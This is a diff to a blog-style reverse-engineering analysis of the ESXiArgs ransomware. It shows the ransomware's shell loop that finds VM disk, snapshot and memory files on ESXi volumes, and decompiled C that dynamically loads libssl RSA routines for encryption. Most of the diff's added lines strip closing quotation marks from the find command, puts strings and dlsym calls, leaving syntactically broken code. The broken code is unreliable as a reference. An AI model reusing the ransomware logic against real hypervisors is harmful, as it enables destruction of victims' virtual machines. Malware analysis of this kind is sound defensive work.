@@ -47,7 +47,7 @@ chmod +x $CLEAN_DIR/encrypt
 for volume in $(IFS='\n' esxcli storage filesystem list | grep "/vmfs/volumes/" | awk -F'  ' '{print $2}'); do
   echo "START VOLUME: $volume"
   IFS=$'\n'
-  for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem"); do
+  for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem); do
       if [[ -f "$file_e" ]]; then
         size_kb=$(du -k $file_e | awk '{print $1}')
         if [[ $size_kb -eq 0 ]]; then
@@ -75,7 +75,7 @@ for volume in $(IFS='\n' esxcli storage filesystem list | grep "/vmfs/volumes/" 
 This 1st `for loop` is going through every volumes in the `/vmfs/volumes/` directory.
 
 ```bash
-for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem"); do
+for file_e in $( find "/vmfs/volumes/$volume/" -type f -name "*.vmdk" -o -name "*.vmx" -o -name "*.vmxf" -o -name "*.vmsd" -o -name "*.vmsn" -o -name "*.vswp" -o -name "*.vmss" -o -name "*.nvram" -o -name "*.vmem); do
 ```
 
 This 2nd `for loop` is going to try to find any files in those volumes with the following extensions:
@@ -166,7 +166,7 @@ Let's load this up into a disassembler to reverse engineer this.
 
 I'll be using [[**Ghidra**]](https://ghidra-sre.org/) as my disassembler of choice.
 
-![]("./images/esxiargs-analysis/ghidra-esxiargs.png")
+![](./images/esxiargs-analysis/ghidra-esxiargs.png)
 
 Here's the `main` function of the `encrypt` binary:
 ```c
@@ -183,10 +183,10 @@ undefined4 main(int param_1,long param_2)
   uint local_c;
   
   if (param_1 < 3) {
-    puts("usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]");
-    puts("       enc_step   -   number of MB to skip while encryption");
-    puts("       enc_size   -   number of MB in encryption block");
-    puts("       file_size  -   file size in bytes (for sparse files)\n");
+    puts("usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]);
+    puts("       enc_step   -   number of MB to skip while encryption);
+    puts("       enc_size   -   number of MB in encryption block);
+    puts("       file_size  -   file size in bytes (for sparse files)\n);
     local_4c = 1;
   }
   else {
@@ -253,10 +253,10 @@ Since `param_2`'s type is `long`, I'll change it back to being `char**` using Gh
 
 ```c
 if (argc < 3) {
-  puts("usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]");
-  puts("       enc_step   -   number of MB to skip while encryption");
-  puts("       enc_size   -   number of MB in encryption block");
-  puts("       file_size  -   file size in bytes (for sparse files)\n");
+  puts("usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]);
+  puts("       enc_step   -   number of MB to skip while encryption);
+  puts("       enc_size   -   number of MB in encryption block);
+  puts("       file_size  -   file size in bytes (for sparse files)\n);
   local_4c = 1;
 }
 ```
@@ -309,43 +309,43 @@ if (plibssl == 0) {
 Next, we can see that if `plibssl == 0` which means if the previous `dlopen()` function fails, it will try to find some version of `libssl.so` via `"libssl.so.%d"`.
 
 ```c
-lBIO_new_mem_buf = dlsym(plibssl,"BIO_new_mem_buf");
+lBIO_new_mem_buf = dlsym(plibssl,"BIO_new_mem_buf);
 ```
 
 After it finds a `libssl.so`, it uses `dlsym()` to dynamically load the `BIO_new_mem_buf` symbol from the libssl at runtime.
 
 ```c
-lERR_error_string = dlsym(plibssl,"ERR_error_string");
+lERR_error_string = dlsym(plibssl,"ERR_error_string);
 if (lERR_error_string == 0) {
   local_4c = 4;
 }
 else {
-  lPEM_read_bio_RSA_PUBKEY = dlsym(plibssl,"PEM_read_bio_RSA_PUBKEY");
+  lPEM_read_bio_RSA_PUBKEY = dlsym(plibssl,"PEM_read_bio_RSA_PUBKEY);
   if (lPEM_read_bio_RSA_PUBKEY == 0) {
       local_4c = 5;
   }
   else {
-    lPEM_read_bio_RSAPrivateKey = dlsym(plibssl,"PEM_read_bio_RSAPrivateKey");
+    lPEM_read_bio_RSAPrivateKey = dlsym(plibssl,"PEM_read_bio_RSAPrivateKey);
     if (lPEM_read_bio_RSAPrivateKey == 0) {
       local_4c = 6;
     }
     else {
-      lRAND_pseudo_bytes = dlsym(plibssl,"RAND_pseudo_bytes");
+      lRAND_pseudo_bytes = dlsym(plibssl,"RAND_pseudo_bytes);
       if (lRAND_pseudo_bytes == 0) {
         local_4c = 7;
       }
       else {
-        lRSA_public_encrypt = dlsym(plibssl,"RSA_public_encrypt");
+        lRSA_public_encrypt = dlsym(plibssl,"RSA_public_encrypt);
         if (lRSA_public_encrypt == 0) {
           local_4c = 8;
         }
         else {
-          lRSA_private_decrypt = dlsym(plibssl,"RSA_private_decrypt");
+          lRSA_private_decrypt = dlsym(plibssl,"RSA_private_decrypt);
           if (lRSA_private_decrypt == 0) {
             local_4c = 9;
           }
           else {
-            lRSA_size = dlsym(plibssl,"RSA_size");
+            lRSA_size = dlsym(plibssl,"RSA_size);
             if (lRSA_size == 0) {
               local_4c = 10;
             }
@@ -391,7 +391,7 @@ if (__nbytes == 0xffffffffffffffff) {
   local_3c = 2;
 }
 else if (__nbytes == 0) {
-  puts("get_pk_data: key file is empty!");
+  puts("get_pk_data: key file is empty!);
   local_3c = 3;
 }
 ```
@@ -536,7 +536,7 @@ undefined4 rsa_encrypt(undefined8 param_1,undefined8 param_2,int param_3,void **
     }
   }
   else {
-    puts("encrypt_bytes: too big data");
+    puts("encrypt_bytes: too big data);
     local_44 = 1;
   }
   return local_44;
